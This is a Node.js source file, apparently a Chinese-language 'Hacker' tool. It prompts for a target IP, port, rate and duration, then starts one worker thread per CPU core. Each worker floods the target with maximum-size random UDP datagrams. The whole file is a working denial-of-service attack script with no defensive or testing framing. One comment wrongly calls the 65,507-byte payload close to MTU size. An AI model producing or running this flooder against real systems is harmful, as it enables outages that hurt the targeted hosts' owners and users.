const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const dgram = require('dgram');
const os = require('os');

const AUTHOR = "Minearm-RPM";
const GITHUB = "https://github.com/Minearm-RPM/Hacker/";

if (isMainThread) {

  const numCPUs = os.cpus().length;
  console.log(`检测到 ${numCPUs} 个CPU核心，将启动 ${numCPUs} 个工作线程。`);

  const rl = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
  });

  function getInput(question) {
    return new Promise((resolve) => {
      rl.question(question, (answer) => {
        resolve(answer);
      });
    });
  }

  async function main() {
    try {
      const ip = await getInput("请输入目标IP地址: ");
      const port = parseInt(await getInput("请输入目标端口: "), 10);
      const speed = parseInt(await getInput("请输入发送速度（包/秒）: "), 10); // 每个工作线程的速度
      const duration = parseFloat(await getInput("请输入发送持续时间（秒）: "));

      if (isNaN(port) || isNaN(speed) || isNaN(duration)) {
        throw new Error("输入的端口号、发送速度或持续时间无效。");
      }

      console.log("开始发送数据包...");

      const workers = [];
      const results = { totalSent: 0 };
      let stopped = false;

      for (let i = 0; i < numCPUs; i++) {
        const worker = new Worker(__filename, {
          workerData: { ip, port, speed, duration }
        });
        workers.push(worker);

        worker.on('message', (msg) => {
          if (stopped) return;
          results.totalSent += msg.sent;
          console.log(`工作线程 ${worker.threadId} 已发送 ${msg.sent} 个数据包`);
        });

        worker.on('error', (err) => {
          console.error(`工作线程 ${worker.threadId} 错误: ${err.message}`);
          stopWorkers();
        });

        worker.on('exit', (code) => {
          if (code !== 0)
            console.error(`工作线程 ${worker.threadId} 退出，代码 ${code}`);
          stopWorkers();
        });
      }
      const timer = setTimeout(() => {
        stopWorkers();
      }, duration * 1000);

      function stopWorkers() {
        stopped = true;
        workers.forEach(worker => worker.terminate());
        clearTimeout(timer);
        console.log(`所有工作线程已停止。总共发送了 ${results.totalSent} 个数据包。`);
        rl.close();
      }
    } catch (err) {
      console.error(err.message);
      rl.close();
    }
  }

  main();

} else {

  const dgram = require('dgram');
  const crypto = require('crypto');

  const { ip, port, speed, duration } = workerData;

  const socket = dgram.createSocket('udp4');
  let sentPackets = 0;
  const startTime = Date.now();

  function sendPacket() {
    if ((Date.now() - startTime) / 1000 >= duration) {
      parentPort.postMessage({ sent: sentPackets });
      socket.close();
      return;
    }
    const byteData = crypto.randomBytes(65507); // 接近MTU大小

    socket.send(byteData, 0, byteData.length, port, ip, (err) => {
      if (err) {
        console.error(`发送错误: ${err.message}`);
        parentPort.postMessage({ sent: sentPackets });
        socket.close();
        return;
      }
      sentPackets += 1;
      const interval = Math.max(0, 1000 / speed - ((Date.now() - startTime) % 1000));
      setTimeout(sendPacket, interval);
    });
  }

  sendPacket();

  socket.on('error', (err) => {
    console.error(`Socket 错误: ${err.message}`);
    parentPort.postMessage({ sent: sentPackets });
    socket.close();
  });
}